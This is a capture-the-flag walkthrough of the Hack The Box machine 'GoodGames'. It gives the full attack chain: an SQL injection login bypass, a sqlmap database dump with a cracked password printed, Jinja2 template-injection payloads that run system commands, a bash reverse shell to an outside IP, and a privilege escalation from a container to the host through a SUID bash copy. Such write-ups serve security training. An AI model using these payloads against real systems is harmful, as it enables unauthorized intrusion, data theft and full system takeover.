# [GoodGames](https://app.hackthebox.com/machines/GoodGames)

```bash
nmap -p- --min-rate 10000 10.10.11.130 -Pn    
```

![Alt text](img/image.png)

I just see port (80) is open, let's do greater nmap scan for this port.

```bash
nmap -A -sC -sV -p80 10.10.11.130
```

![Alt text](img/image-1.png)


From this nmap scan, I just add this ip address into '/etc/hosts' file as **'goodgames.htb'** domain.

![Alt text](img/image-2.png)



I just enumerate this web application via `SQL Injection` to bypass authentication by adding `' or 1=1-- -;`

![Alt text](img/image-3.png)


I also enumerate that there's UNION based SQL Injection attack.

![Alt text](img/image-4.png)


Let's use `sqlmap` to automate this process and dump all the stuff from database.

```bash
sqlmap -r login.req --level 5 --risk 3 --technique "U"
```


I enumerate all database via adding `--dbs` to get db 'main',`--tables` to get table "user", `--dump` to get all data.

```bash
sqlmap -r login.req --level 5 --risk 3 --technique "U" -D "main" -T "user" --dump
```

![Alt text](img/image-5.png)


I crack this password via [Crackstation](https://crackstation.net).

![Alt text](img/image-6.png)


There's another website (internal) which can be seen beyond of 'top dashboard'. 

![Alt text](img/image-7.png)


That's page which redirects into 'internal-administration.goodgames.htb' and I add this domain into '/etc/hosts' file.

I login here via the same credentials.

admin: superadministrator

![Alt text](img/image-8.png)



I can do modifications on this page for 'admin' user.

![Alt text](img/image-9.png)


As I know that's Python language, I will try SSTI payloads for Python template structured languages.
So, If I add SSTI(Server-Side Template Injection) payload `{{ 7 * 7 }}`, it will be `eval`uated.

![Alt text](img/image-10.png)


Let's add our system commands into here.
```bash
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

![Alt text](img/image-11.png)


Now, it's time for reverse shell payload.
```bash
{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.16.7/1337 0>&1"').read() }}   
```

![Alt text](img/image-12.png)


Hola, I got reverse shell from port (1337).

![Alt text](img/image-13.png)


Let's make interactive shell.
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=bash
```

![Alt text](img/image-14.png)


user.txt

![Alt text](img/image-15.png)



**'INTERESTING PORT SCAN'** I will do port scanning as because this machine's ip address is '172.19.0.2', I see that real machine is '172.19.0.1', that's why I can try direct SSH into here


I used the same password (superadministrator)

![Alt text](img/image-16.png)


From `root` user of container I see that while this user create a file , automatically owner of this file become real `root` user.

If I create `bash` file, it will be `root` user as owner, If I add SUID binary, I can get root shell.


1.First, we need to run below command via `augustus` user.
```bash
cp /bin/bash .
```

![Alt text](img/image-17.png)

2.Second, we need to back into root user for container and run below commands.
```bash
chown root:root bash 
chmod 4777 bash  #add suid binary, means file creator can run this via sudo privileges
```

![Alt text](img/image-18.png)

3.Come back to shell for `augustus` user and run `bash -p` to be root user of machine.

![Alt text](img/image-19.png)


root.txt

![Alt text](img/image-20.png)